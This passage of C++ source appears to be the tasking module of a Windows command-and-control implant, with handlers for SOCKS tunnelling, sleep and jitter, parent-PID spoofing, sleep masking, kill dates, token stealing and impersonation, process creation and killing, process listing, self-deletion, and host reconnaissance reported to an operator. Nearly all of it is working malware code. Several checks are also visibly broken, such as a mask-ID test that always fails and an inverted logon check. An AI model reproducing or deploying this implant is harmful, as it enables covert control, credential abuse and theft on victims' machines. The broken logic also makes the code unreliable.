                    KhDbg("RecvAll failed: %d", Self->Ws2_32.WSAGetLastError());
                    break;
                }

                TotalRead += DataRead;
            }

            if (TotalRead > 0) {
                respData = (BYTE*)hAlloc(TotalRead);
                if (respData) {
                    Mem::Copy(respData, BuffRecv, TotalRead);
                    respLen = TotalRead;
                }
            }
            hFree(BuffRecv);
        }
        break;
    }
    case KH_SOCKET_CLOSE: {
        SOCKET sock = Self->Skt->Get(ServerID);
        if (sock != INVALID_SOCKET) {
            Self->Ws2_32.closesocket(sock);
            Self->Skt->RmCtx(ServerID);
            KhDbg("socket closed for ServerID %u", ServerID);
        }
        break;
    }
    default:
        KhDbg("unknown operation");
        Result = ERROR_INVALID_PARAMETER;
        break;
    }

    Self->Pkg->Int32(Pkg, IsExit);
    Self->Pkg->Int32(Pkg, ServerID);

    if (respData && respLen) {
        Self->Skt->LogData("sending", respData, respLen);
        PCHAR finalPkt = Self->Pkg->Base64Enc(respData, respLen);
        ULONG finalLen = Self->Pkg->Base64EncSize(respLen);
        Self->Pkg->Bytes(Pkg, (PUCHAR)finalPkt, finalLen);
        hFree(respData);
    }

    if (data) hFree(data);

    KhDbg("SOCKS task finished with status 0x%X", Result);
    return Result;
}

auto DECLFN Task::Config(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    INT32    ConfigCount = Self->Psr->Int32( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "config count: %d", ConfigCount );

    for ( INT i = 0; i < ConfigCount; i++ ) {
        UINT8 ConfigID = Self->Psr->Int32( Parser );
        KhDbg( "config id: %d", ConfigID );
        switch ( ConfigID ) {
            case Enm::Config::Ppid: {
                ULONG ParentID = Self->Psr->Int32( Parser );
                Self->Ps->Ctx.ParentID = ParentID;

                KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); 
                
                break;
            }
            case Enm::Config::Sleep: {
                ULONG NewSleep = Self->Psr->Int32( Parser );
                Self->Session.SleepTime = NewSleep * 1000;

                KhDbg( "new sleep time set to %d ms", Self->Session.SleepTime ); 
                
                break;
            }
            case Enm::Config::Jitter: {
                ULONG NewJitter = Self->Psr->Int32( Parser );
                Self->Session.Jitter = NewJitter;

                KhDbg( "new jitter set to %d", Self->Session.Jitter ); 
                
                break;
            }
            case Enm::Config::BlockDlls: {
                BOOL BlockDlls  = Self->Psr->Int32( Parser );
                Self->Ps->Ctx.BlockDlls = BlockDlls;
                
                KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); 
                
                break;
            }
            case Enm::Config::Mask: {
                INT32 TechniqueID = Self->Psr->Int32( Parser );
                if ( 
                    TechniqueID != eMask::Timer || 
                    TechniqueID != eMask::None 
                ) {
                    KhDbg( "invalid mask id: %d", TechniqueID );
                    return KH_ERROR_INVALID_MASK_ID;
                }
            
                Self->Mk->Ctx.TechniqueID = TechniqueID;
            
                KhDbg( 
                    "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
                    Self->Mk->Ctx.TechniqueID   == eMask::Timer ? "timer" : 
                    ( Self->Mk->Ctx.TechniqueID == eMask::None  ? "wait" : "unknown" ) 
                );

                break;
            }
            case Enm::Config::Spawn: {
                // PCHAR Spawn = Self->InjCtx.;
            }
            case Enm::Config::Killdate: {
                SYSTEMTIME LocalTime { 0 };

                INT16 Year  = (INT16)Self->Psr->Int32( Parser );
                INT16 Month = (INT16)Self->Psr->Int32( Parser );
                INT16 Day   = (INT16)Self->Psr->Int32( Parser );

                Self->Session.KillDate.Day   = Day;
                Self->Session.KillDate.Month = Month;
                Self->Session.KillDate.Year  = Year;

                break;
            }
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Token(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubID = Self->Psr->Int32( Parser );

    Self->Pkg->Byte( Package, SubID );

    KhDbg( "Sub Command ID: %d", SubID );

    switch ( SubID ) {
        case Enm::Token::GetUUID: {
            CHAR*  ProcUser    = nullptr;
            CHAR*  ThreadUser  = nullptr;
            HANDLE TokenHandle = nullptr;

            TokenHandle = Self->Tkn->CurrentPs();
            ThreadUser  = Self->Tkn->GetUser( TokenHandle );
            
            if ( ThreadUser ) {
                Self->Pkg->Str( Package, ThreadUser );
                hFree( ThreadUser );
                Self->Ntdll.NtClose( TokenHandle );

                KhSetError( ERROR_SUCCESS );
            }

            break;
        }
        case Enm::Token::Store: {

        }
        case Enm::Token::Steal: {
            ULONG ProcessID = Self->Psr->Int32( Parser );
            BOOL  TokenUse  = Self->Psr->Int32( Parser );
            BOOL  Success   = FALSE;

            KhDbg("id: %d use: %s", ProcessID, TokenUse ? "true" : "false");
            TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );

            KhDbg("dbg");

            if ( ! Token ) {
                Self->Pkg->Int32( Package, FALSE ); break;
            }

            KhDbg("dbg");

            if ( TokenUse ) Self->Tkn->Use( Token->Handle );

            KhDbg("dbg");

            Self->Pkg->Int32( Package, TRUE );

            KhDbg( "Token ID: %d", Token->TokenID );
            KhDbg( "Process ID: %d", Token->ProcessID );
            KhDbg( "User Name: %s", Token->User );
            KhDbg( "Host Name: %d", Token->Host );
            KhDbg( "Handle: %X", Token->Handle );

            Self->Pkg->Int32( Package, Token->TokenID );
            Self->Pkg->Int32( Package, Token->ProcessID );
            Self->Pkg->Str( Package, Token->User );
            Self->Pkg->Str( Package, Token->Host );
            Self->Pkg->Int64( Package, (INT64)Token->Handle );

            break;
        }
        case Enm::Token::Use: {
            HANDLE Token = (HANDLE)Self->Psr->Int32( Parser );
            Self->Pkg->Int32( Package, Self->Tkn->Use( Token ) );
            break;
        }
        case Enm::Token::Rm: {
            ULONG TokenID = Self->Psr->Int32( Parser );
            Self->Pkg->Int32( Package, Self->Tkn->Rm( TokenID ) );  
            break;
        }
        case Enm::Token::Rev2Self: {
            Self->Pkg->Int32( Package, Self->Tkn->Rev2Self() ); break;
        }
        case Enm::Token::Make: {
            CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
            CHAR*  Password    = Self->Psr->Str( Parser, 0 );
            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
            HANDLE TokenHandle = nullptr;

            KhDbg("%s %s %s\n", UserName, Password, DomainName);

            BOOL Success = FALSE;

            Self->Advapi32.LogonUserA( 
                UserName, DomainName, Password, LOGON_NETCREDENTIALS_ONLY, LOGON32_PROVIDER_DEFAULT, &TokenHandle
            );
            if ( ! TokenHandle || TokenHandle != INVALID_HANDLE_VALUE ) {
                break;
            }

            if ( Self->Tkn->Add( TokenHandle, Self->Session.ProcessID ) ) {
                Success = TRUE;
            }

            Self->Pkg->Int32( Package, Success );

            break;
        }
        case Enm::Token::GetPriv: {
            HANDLE TokenHandle = Self->Tkn->CurrentPs();
            Self->Pkg->Int32( Package, Self->Tkn->GetPrivs( TokenHandle ) );
            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Enm::Token::ListPriv: {
            ULONG       PrivListLen = 0;
            PRIV_LIST** PrivList    = nullptr;
            HANDLE      TokenHandle = Self->Tkn->CurrentPs();

            PrivList = (PRIV_LIST**)Self->Tkn->ListPrivs( TokenHandle, PrivListLen );

            Self->Pkg->Int32( Package, PrivListLen );

            for ( INT i = 0; i < PrivListLen; i++ ) {
                Self->Pkg->Str( Package, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                Self->Pkg->Int32( Package, static_cast<PRIV_LIST**>(PrivList)[i]->Attributes );
                if ( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName ) 
                    hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );

                hFree( PrivList[i] );
            }

            Self->Ntdll.NtClose( TokenHandle );
            hFree( PrivList );

            break;
        }
    }

    return KhGetError;
}

auto DECLFN Task::Process(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package     = Job->Pkg;
    PARSER*  Parser      = Job->Psr;
    UINT8    SbCommandID = Self->Psr->Byte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );

    switch ( SbCommandID ) {
        case Enm::Ps::Create: {
            G_PACKAGE = Package;

            CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
            PROCESS_INFORMATION PsInfo      = { 0 };

            KhDbg("start to run: %s", CommandLine);

            Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
            if ( !Success ) return KhGetError;

            Self->Pkg->Int32( Package, PsInfo.dwProcessId );
            Self->Pkg->Int32( Package, PsInfo.dwThreadId  );

            if ( Self->Ps->Out.p ) {
                Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
                hFree( Self->Ps->Out.p );
                Self->Ps->Out.p = nullptr;
            } 
            
            break;
        }
        case Enm::Ps::Kill: {
            BOOL   RoutineStatus = TRUE;
            ULONG  ProcessId     = Self->Psr->Int32( Parser );
            HANDLE ProcessHandle = Self->Ps->Open( PROCESS_TERMINATE, FALSE, ProcessId );

            if ( ProcessHandle == INVALID_HANDLE_VALUE ) RoutineStatus = FALSE;

            RoutineStatus = Self->Krnl32.TerminateProcess( ProcessHandle, EXIT_SUCCESS );
            
            Self->Pkg->Int32( Package, RoutineStatus ); break;        
        }
        case Enm::Ps::ListPs: {
            PVOID ValToFree = NULL;
            ULONG ReturnLen = 0;
            ULONG Status    = STATUS_SUCCESS;
            BOOL  Isx64     = FALSE;
            PCHAR UserToken = { 0 };
            ULONG UserLen   = 0;

            CHAR FullPath[MAX_PATH] = { 0 };

            HANDLE TokenHandle   = nullptr;
            HANDLE ProcessHandle = nullptr;

            UNICODE_STRING* CommandLine = { 0 };
            FILETIME        FileTime    = { 0 };
            SYSTEMTIME      CreateTime  = { 0 };

            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };

            Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)hAlloc( ReturnLen );
            if ( !SysProcInfo ) {}
            
            Status = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
            if ( Status != STATUS_SUCCESS ) {}

            ValToFree = SysProcInfo;

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            do {
                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                if ( Self->Krnl32.K32GetModuleFileNameExA( ProcessHandle, nullptr, FullPath, MAX_PATH ) ) {
                    Self->Pkg->Str( Package, FullPath );
                    Mem::Zero( (UPTR)FullPath, MAX_PATH );
                } else {
                    Self->Pkg->Str( Package, "-" );
                }

                if ( !SysProcInfo->ImageName.Buffer ) {
                    Self->Pkg->Wstr( Package, L"-" );
                } else {
                    Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                }

                CommandLine = (UNICODE_STRING*)hAlloc( sizeof( UNICODE_STRING ) );

                Self->Ntdll.NtQueryInformationProcess( 
                    ProcessHandle, ProcessCommandLineInformation, CommandLine, sizeof( CommandLine ), nullptr 
                );
                if ( CommandLine->Buffer ) {
                    Self->Pkg->Wstr( Package, CommandLine->Buffer );
                } else {
                    Self->Pkg->Wstr( Package, L"-" );
                }

                hFree( CommandLine );
      
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
                Self->Pkg->Int32( Package, SysProcInfo->HandleCount );
                Self->Pkg->Int32( Package, SysProcInfo->SessionId );
                Self->Pkg->Int32( Package, SysProcInfo->NumberOfThreads );

                if ( ProcessHandle ) {
                    Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
                }
                
                UserToken = Self->Tkn->GetUser( TokenHandle );            
                                
                if ( !UserToken ) {
                    Self->Pkg->Str( Package, "-" );
                } else {
                    Self->Pkg->Str( Package, UserToken );
                    hFree( UserToken );
                    Self->Ntdll.NtClose( TokenHandle );
                }
            
                if ( ProcessHandle ) {
                    Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
                }
                
                Self->Pkg->Int32( Package, Isx64 );
                
                SysThreadInfo = SysProcInfo->Threads;
 
                if ( ProcessHandle && ProcessHandle != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ProcessHandle );
            
                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            } while ( SysProcInfo->NextEntryOffset );

            if ( ValToFree ) hFree( ValToFree );

            break;
        }
    } 

    KhRetSuccess;
}

auto DECLFN Task::SelfDel(
    _In_ JOBS* Job
) -> ERROR_CODE {
    
    Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );

    return KhGetError;
}

auto DECLFN Task::Exit(
    _In_ JOBS* Job
) -> ERROR_CODE {
    INT8 ExitType = Self->Psr->Byte( Job->Psr );
    Job->State    = KH_JOB_READY_SEND;

    Self->Jbs->Send( Self->Jbs->PostJobs );
    Self->Jbs->Cleanup();

    Self->Hp->Clean();

    if ( ExitType == Enm::Exit::Proc ) {
        Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == Enm::Exit::Thread ) {
        Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    KhRetSuccess;
}

auto DECLFN Task::GetInfo(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Pkg = Job->Pkg;

    Self->Pkg->Str( Pkg, Self->Session.AgentID );
    Self->Pkg->Int64( Pkg, Self->Session.Base.Start );
    Self->Pkg->Int32( Pkg, Self->Session.Base.Length );
    Self->Pkg->Str( Pkg, Self->Session.ImagePath );
    Self->Pkg->Str( Pkg, Self->Session.CommandLine );
    Self->Pkg->Int32( Pkg, Self->Session.ProcessID );
    Self->Pkg->Int32( Pkg, Self->Session.ThreadID );
    Self->Pkg->Int32( Pkg, Self->Session.ParentID );
    Self->Pkg->Int64( Pkg, Self->Session.HeapHandle );
    Self->Pkg->Int32( Pkg, Self->Session.SleepTime );
    Self->Pkg->Int32( Pkg, Self->Session.ProcessArch );
    Self->Pkg->Int16( Pkg, (INT16) Self->Session.Elevated | (INT16) 0 );
    
    Self->Pkg->Int16( Pkg, (INT16) Self->Mk->Ctx.TechniqueID | (INT16) 0 );
    Self->Pkg->Int16( Pkg, (INT16) Self->Mk->Ctx.Heap | (INT16) 0 );
    Self->Pkg->Int64( Pkg, Self->Mk->Ctx.JmpGadget );
    Self->Pkg->Int64( Pkg, Self->Mk->Ctx.NtContinueGadget );

    Self->Pkg->Str( Pkg, Self->Machine.UserName );
    Self->Pkg->Str( Pkg, Self->Machine.CompName );
    Self->Pkg->Str( Pkg, Self->Machine.DomName );
    Self->Pkg->Str( Pkg, Self->Machine.NetBios );
    Self->Pkg->Int32( Pkg, Self->Machine.OsArch | (ULONG) 0 );
    Self->Pkg->Int32( Pkg, Self->Machine.OsMjrV );
    Self->Pkg->Int32( Pkg, Self->Machine.OsMnrV );
    Self->Pkg->Str( Pkg, Self->Machine.OsBuild );
    Self->Pkg->Str (Pkg, Self->Machine.ProductType );
    Self->Pkg->Int32( Pkg, Self->Machine.TotalRAM );
    Self->Pkg->Int32( Pkg, Self->Machine.AvalRAM );
    Self->Pkg->Int32( Pkg, Self->Machine.UsedRAM );
    Self->Pkg->Int32( Pkg, Self->Machine.PercentRAM );
    Self->Pkg->Str( Pkg, Self->Machine.ProcessorName );
    Self->Pkg->Int32( Pkg, Self->Machine.ProcessorsNbr );

    KhRetSuccess;
}
